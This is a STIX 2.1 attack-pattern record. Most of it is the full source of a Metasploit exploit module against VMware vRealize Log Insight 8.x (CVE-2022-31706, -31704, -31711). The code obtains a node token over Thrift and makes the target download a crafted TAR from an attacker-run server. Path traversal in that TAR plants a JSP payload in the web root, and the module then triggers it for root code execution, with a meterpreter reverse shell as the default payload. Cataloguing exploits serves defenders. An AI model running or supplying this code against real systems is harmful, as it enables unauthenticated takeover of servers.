{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--591928de-62e9-4ddc-9baa-cb1dfeb9790f",
    "created": "2024-08-14T17:04:14.733219Z",
    "modified": "2024-08-14T17:04:14.733228Z",
    "name": "VMware vRealize Log Insight Unauthenticated RCE",
    "description": " VMware vRealize Log Insights versions v8.x contains multiple vulnerabilities, such as directory traversal, broken access control, deserialization, and information disclosure. When chained together, these vulnerabilities allow a remote, unauthenticated attacker to execute arbitrary commands on the underlying operating system as the root user.  This module achieves code execution via triggering a `RemotePakDownloadCommand` command via the exposed thrift service after obtaining the node token by calling a `GetConfigRequest` thrift command. After the download, it will trigger a `PakUpgradeCommand` for processing the specially crafted PAK archive, which then will place the JSP payload under a certain API endpoint (pre-authenticated) location upon extraction for gaining remote code execution.  Successfully tested against version 8.0.2.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_vrli_rce.rb",
            "external_id": "vmware_vrli_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-31706"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-31704"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-31711"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2023-0001.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'rex/proto/thrift'\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::CmdStager::HTTP\n  include Msf::Exploit::Retry\n  include Msf::Exploit::FileDropper # includes register_files_for_cleanup\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vRealize Log Insight Unauthenticated RCE',\n        'Description' => %q{\n          VMware vRealize Log Insights versions v8.x contains multiple vulnerabilities, such as\n          directory traversal, broken access control, deserialization, and information disclosure.\n          When chained together, these vulnerabilities allow a remote, unauthenticated attacker to\n          execute arbitrary commands on the underlying operating system as the root user.\n\n          This module achieves code execution via triggering a `RemotePakDownloadCommand` command\n          via the exposed thrift service after obtaining the node token by calling a `GetConfigRequest`\n          thrift command. After the download, it will trigger a `PakUpgradeCommand` for processing the\n          specially crafted PAK archive, which then will place the JSP payload under a certain API\n          endpoint (pre-authenticated) location upon extraction for gaining remote code execution.\n\n          Successfully tested against version 8.0.2.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Horizon3.ai Attack Team', # Original POC & analysis\n          'Ege BALCI <egebalci[at]pm.me>', # Metasploit Module\n        ],\n        'References' => [\n          ['ZDI', '23-116'],\n          ['ZDI', '23-115'],\n          ['CVE', '2022-31706'],\n          ['CVE', '2022-31704'],\n          ['CVE', '2022-31711'],\n          ['URL', 'https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2023-0001.html'],\n        ],\n        'DisclosureDate' => '2023-01-24',\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'VMware vRealize Log Insight < v8.10.2',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'SSL' => true,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n                'PrependFork' => true\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Payload' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'WfsDelay' => 15\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptPort.new('THRIFT_PORT', [true, 'Thrift service port', 16520]),\n        OptString.new('TARGETURI', [true, 'The URI of the VRLI web service', '/'])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('ThriftTimeout', [ true, 'Thrift response and connection timeout duration', 10 ]),\n        OptInt.new('WaitForUpgradeDuration', [ true, 'The sleep duration in seconds for PakUpgrade process', 2 ])\n      ]\n    )\n  end\n\n  def check\n    print_status \"Checking if #{peer} can be exploited.\"\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'i18n', 'component'),\n      'method' => 'GET'\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\") unless res.code == 200\n    translation = JSON.parse(res.body.gsub(/^.+= /, '').gsub(/;/, ''))\n    return Exploit::CheckCode::Unknown if translation.nil? || !translation.key?('version')\n\n    version = Rex::Version.new(translation['version'])\n    if version <= Rex::Version.new('8.10') && version >= Rex::Version.new('8.0') # This is not exactly the product version but we can use it\n      return Exploit::CheckCode::Appears(\"VMware XRLI Version: #{translation['version']}\")\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def generate_malicious_tar\n    mf_file = <<~EOF.strip\n      {\n          \"CHECKSUMS\": [\n              {\n                  \"CHECKSUM\": \"407791f5831c4f5321cda36ff2e3b63da2819354\",#{' '}\n                  \"FILE_NAME\": \"eula.txt\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"8ab2c0a6d01a36d0daad230dbcb229f1b87154e6\",#{' '}\n                  \"FILE_NAME\": \"cn_eula.txt\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"8ca69bdc2ddda5228e893c4843d9f4afc0790247\",#{' '}\n                  \"FILE_NAME\": \"de_eula.txt\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"4278004a1f2a7a3f2d9310983679868ebe19e088\",#{' '}\n                  \"FILE_NAME\": \"es_eula.txt\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"95280fd7033b59094703a29cc5d6ff803c5725af\",#{' '}\n                  \"FILE_NAME\": \"fr_eula.txt\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"f8ee67f279b7f56c953daa737bbbaad3f0cb719d\",#{' '}\n                  \"FILE_NAME\": \"ja_eula.txt\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"aaa14f774fc9fe487ae8fea59adfca532928f4a2\",#{' '}\n                  \"FILE_NAME\": \"ko_eula.txt\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"d7003b652dd28d28af310c652e2a164acaf17580\",#{' '}\n                  \"FILE_NAME\": \"tw_eula.txt\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"b0034c7f14876be3b6a85bde0322c83b78027d70\",#{' '}\n                  \"FILE_NAME\": \"upgrade-driver\"\n              },#{' '}\n              {\n                  \"CHECKSUM\": \"b906d570101d29646966435d2bed8479f4437216\",#{' '}\n                  \"FILE_NAME\": \"upgrade-image-8.10.2-21145187.rpm\"\n              }\n          ],#{' '}\n          \"FROM_VERSION\": \"8.8.0-0\",#{' '}\n          \"REQUIRED_SPACE\": \"1073741824\",#{' '}\n          \"RPM_INFO\": {\n              \"KEY_LIST\": [],#{' '}\n              \"REBOOT\": \"False\",#{' '}\n              \"RPM_LIST\": [\n                  {\n                      \"ARGUMENTS\": [\n                          \"--nodeps\"\n                      ],#{' '}\n                      \"FILE_NAME\": \"upgrade-image-8.10.2-21145187.rpm\",#{' '}\n                      \"OPTION\": \"INSTALL_OR_UPGRADE\"\n                  }\n              ]\n          },#{' '}\n          \"TO_VERSION\": \"8.10.2-21145187\"\n      }\n    EOF\n\n    cert_file = <<~CERT\n      SHA1(VMware-vRealize-Log-Insight.mf)= 9869831f4522f9aaaf2f71b54267c487a20c0d46f4dc884b56a2c77ea971aabd2839a39b22b0a864fa1825c7a637f25c85b99cfb9bf528990b7692cc5d526398fa6000809a94baaf9edcf20fab919f866014745bbf0a2cabadd76b8b6ec0ef862b803039021a4ebed2632bdecf2b77c60389e31f093ad010abeb33de1e95e59cb66a15c019b35453d71484e13f728fa74736bbe4cde37feddacef021feb0023b052ca00dd4563f4424e6387c33ffa166fb0331581a3889be4f2515512f1f15ea5d56aa43fe6a8d9b347b242edf2276eba7b055b8463f1151eab84d97d4d58bef4708080dbf0b96d4783ca8b596467a8965b91c2fddf1da549c0df34aa457f776\n      -----BEGIN CERTIFICATE-----\n      MIIDyzCCArOgAwIBAgIJAKH7xLtwMqSZMA0GCSqGSIb3DQEBBQUAME0xCzAJBgNV\n      BAYTAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRIwEAYDVQQHEwlQYWxvIEFsdG8x\n      FTATBgNVBAoTDFZNd2FyZSwgSW5jLjAeFw0xMDAyMjYyMjE3NDFaFw0yNjAxMDMy\n      MjE3NDFaME0xCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRIwEAYD\n      VQQHEwlQYWxvIEFsdG8xFTATBgNVBAoTDFZNd2FyZSwgSW5jLjCCASAwDQYJKoZI\n      hvcNAQEBBQADggENADCCAQgCggEBALU9NUtC39fqG7yo2XAswUmtli9uA+31uAMw\n      9FFHAEv/it8pzBQZ/4r+2bN+GnXOWhuDd1K4ApKMRvoO4LwQfZxrkx4pXrsu0gdb\n      4OunHw0D8MrdzSoob8Js/uq+IJ+8Bhsc6b7RzTUt9HeDWzHasAJVgMsjehGt23ay\n      9FKOT6dVD6D/Xi3qJnB/4t/XNS6L63dC3ea4guzKDyLaXIP5bf/m56jvVImFjhhT\n      W2ASbnEUlZIVrEuyVcdG7e3FvZufE553JmHL0YG/0m5bIHXKRzBRx0D3HHOAzOKw\n      kkOnxJHSTN4Hz8hSYCWvzUAjSYL3Q8qiTd7GHJ2ynsRnu3KlzKUCAQOjga8wgaww\n      HQYDVR0OBBYEFHg8KQJdm8NPQDmYP41uEgKG+VNwMH0GA1UdIwR2MHSAFHg8KQJd\n      m8NPQDmYP41uEgKG+VNwoVGkTzBNMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2Fs\n      aWZvcm5pYTESMBAGA1UEBxMJUGFsbyBBbHRvMRUwEwYDVQQKEwxWTXdhcmUsIElu\n      Yy6CCQCh+8S7cDKkmTAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBBQUAA4IBAQCP\n      nVEBVF2jYEsgaTJ1v17HNTVTD5pBPfbQk/2vYVZEWL20PtJuLeSWwoo5+TnCSp69\n      i9n1Hpm9JWHjyb1Lba8Xx7VC4FferIyxt0ivRm9l9ouo/pQAR8xyqjTg1qfr5V8S\n      fZElKbjpzSMPrxLwF77h+YB+YjqWAJpVV+fAkAvK7K9vMiFgW60teZBxVW/XlmG0\n      IJaSUWSI3/A+bA6fuIy8PMmpQMtm0droHrCnViAVRhMMgEC/doMH1GqUSmoiyQ1G\n      PifLAp5wV5/HV+S9AGrb8HGdWIvW+kBgmCl0wSf2JFYm1bpq30CVE4EC0MAY1mJG\n      vSqQGIbCybw5KTCXRQ8d\n      -----END CERTIFICATE-----\n    CERT\n\n    # Generate a TAR archive with dir traversal...\n    print_status 'Encoding the payload as JSP'\n    payload_jsp = Msf::Util::EXE.to_jsp(generate_payload_exe)\n    jsp_name = 'api-v5-documentation.jsp' # version number can be randomized\n    slip_name = \"../../usr/lib/loginsight/application/3rd_party/apache-tomcat-8.5.82/webapps/ROOT/loginsight/api/#{jsp_name}\"\n    register_files_for_cleanup(slip_name.gsub('../..', ''))\n    rand_data = Rex::Text.rand_text_alpha(35000..36000) # For realistic packet size\n    dummy_files = ['upgrade-image-8.10.2-21145187.rpm', 'upgrade-driver', 'eula.txt'] # Dummy but also necessary\n\n    tar = StringIO.new\n    Rex::Tar::Writer.new(tar) do |t|\n      dummy_files.each do |dum|\n        t.add_file(dum, 0o644) do |f|\n          f.write(rand_data)\n        end\n      end\n      t.add_file('VMware-vRealize-Log-Insight.cert', 0o644) do |crt| # We actually need the content of these files\n        crt.write(cert_file)\n      end\n      t.add_file('VMware-vRealize-Log-Insight.mf', 0o644) do |mf|\n        mf.write(mf_file)\n      end\n      t.add_file(slip_name, 0o644) do |f|\n        f.write(payload_jsp)\n      end\n    end\n    tar.seek(0)\n    data = tar.read\n    tar.close\n    data\n  end\n\n  def on_request_uri(cli, _request)\n    payload_tar = generate_malicious_tar\n    print_status \"Malicious TAR payload created (#{payload_tar.length} bytes)\"\n    print_good(\"Payload requested by #{peer}, sending...\")\n    @got_request = true\n    send_response(cli, payload_tar)\n  end\n\n  def exploit\n    # This is an important check...\n    fail_with(Failure::BadConfig, 'SRVHOST can\\'t be localhost') if datastore['SRVHOST'] =~ /(127|0)\\.0\\.0\\.(0|1)|localhost/\n\n    # Step 1 generate malicious TAR archive\n    file_name = Rex::Text.rand_text_alpha(7)\n    pak_name = \"#{file_name}.pak\"\n    register_files_for_cleanup(\"/tmp/#{pak_name}\")\n    print_status('Starting Payload Server')\n    start_service('Path' => \"/#{file_name}.tar\")\n\n    # Connect to the Apache Thrift service\n    thrift_client = Rex::Proto::Thrift::Client.new(\n      target_host,\n      datastore['THRIFT_PORT'],\n      context: { 'Msf' => framework, 'MsfExploit' => self },\n      timeout: datastore['ThriftTimeout']\n    )\n    thrift_client.connect\n\n    # Step 2 obtain node token\n    print_status 'Fetching thrift config...'\n    config = thrift_client.call(\n      'getConfig',\n      Rex::Proto::Thrift::ThriftData.struct(1, [ Rex::Proto::Thrift::ThriftData.stop ]),\n      Rex::Proto::Thrift::ThriftData.stop\n    )\n    config_xml = Rex::Proto::Thrift::ThriftStruct.flatten(config).dig(0, 3)\n    fail_with(Failure::UnexpectedReply, 'Could not obtain configuration XML') if config_xml.nil?\n\n    token = Nokogiri::XML(config_xml).xpath('/config/distributed/daemon')&.attr('token').to_s\n    fail_with(Failure::UnexpectedReply, 'Could not obtain node token') if token.nil? || token.empty?\n    print_good \"Obtained node token: #{token}\"\n\n    print_status 'Sending getNodeType...'\n    thrift_client.call('getNodeType', Rex::Proto::Thrift::ThriftData.stop)\n\n    # Step 3 download the malicious pak\n    server_url = \"http://#{Rex::Socket.to_authority(datastore['SRVHOST'], datastore['SRVPORT'])}/#{file_name}.tar\"\n    print_status 'Sending RemotePakDownloadCommand...'\n    thrift_client.call(\n      'runCommand',\n      Rex::Proto::Thrift::ThriftData.struct(1, [\n        Rex::Proto::Thrift::ThriftData.struct(1, [\n          Rex::Proto::Thrift::ThriftData.i32(1, 9),\n          Rex::Proto::Thrift::ThriftData.struct(10, [\n            Rex::Proto::Thrift::ThriftData.utf7(1, token),\n            Rex::Proto::Thrift::ThriftData.utf7(2, server_url),\n            Rex::Proto::Thrift::ThriftData.utf7(3, file_name),\n            Rex::Proto::Thrift::ThriftData.stop\n          ]),\n          Rex::Proto::Thrift::ThriftData.stop\n        ]),\n        Rex::Proto::Thrift::ThriftData.i64(2, 2000),\n        Rex::Proto::Thrift::ThriftData.stop\n      ]),\n      Rex::Proto::Thrift::ThriftData.stop\n    )\n    retry_until_truthy(timeout: datastore['ReconnectTimeout'].to_i) do\n      @got_request\n    end\n\n    # Step 4 trigger pak upgrade\n    print_status 'Sending PakUpgradeCommand...'\n    thrift_client.call(\n      'runCommand',\n      Rex::Proto::Thrift::ThriftData.struct(1, [\n        Rex::Proto::Thrift::ThriftData.struct(1, [\n          Rex::Proto::Thrift::ThriftData.i32(1, 8),\n          Rex::Proto::Thrift::ThriftData.struct(9, [\n            Rex::Proto::Thrift::ThriftData.utf7(1, pak_name),\n            Rex::Proto::Thrift::ThriftData.boolean(2, false),\n            Rex::Proto::Thrift::ThriftData.utf7(3, '/dev/null'),\n            Rex::Proto::Thrift::ThriftData.boolean(4, false),\n            Rex::Proto::Thrift::ThriftData.utf7(5, 'eng'),\n            Rex::Proto::Thrift::ThriftData.boolean(6, false),\n            Rex::Proto::Thrift::ThriftData.stop\n          ]),\n          Rex::Proto::Thrift::ThriftData.stop\n        ]),\n        Rex::Proto::Thrift::ThriftData.i64(2, 2000),\n        Rex::Proto::Thrift::ThriftData.stop\n      ]),\n      Rex::Proto::Thrift::ThriftData.stop\n    )\n    print_good 'PakUpgrade request is successful'\n    print_status \"Waiting #{datastore['WaitForUpgradeDuration']} second for PakUpgrade...\"\n    sleep(datastore['WaitForUpgradeDuration'])\n\n    # Step 5 trigger the JSP payload.\n    print_status \"#{peer} - Triggering JSP payload...\"\n    thrift_client.close\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'rest-api', 'v5'),\n      'method' => 'GET'\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\") unless res.code == 200\n  rescue Rex::Proto::Thrift::Error::InvalidFrameError, Rex::Proto::Thrift::Error::UnexpectedReplyError => e\n    fail_with(Failure::UnexpectedReply, \"#{peer} - #{e}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-01-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}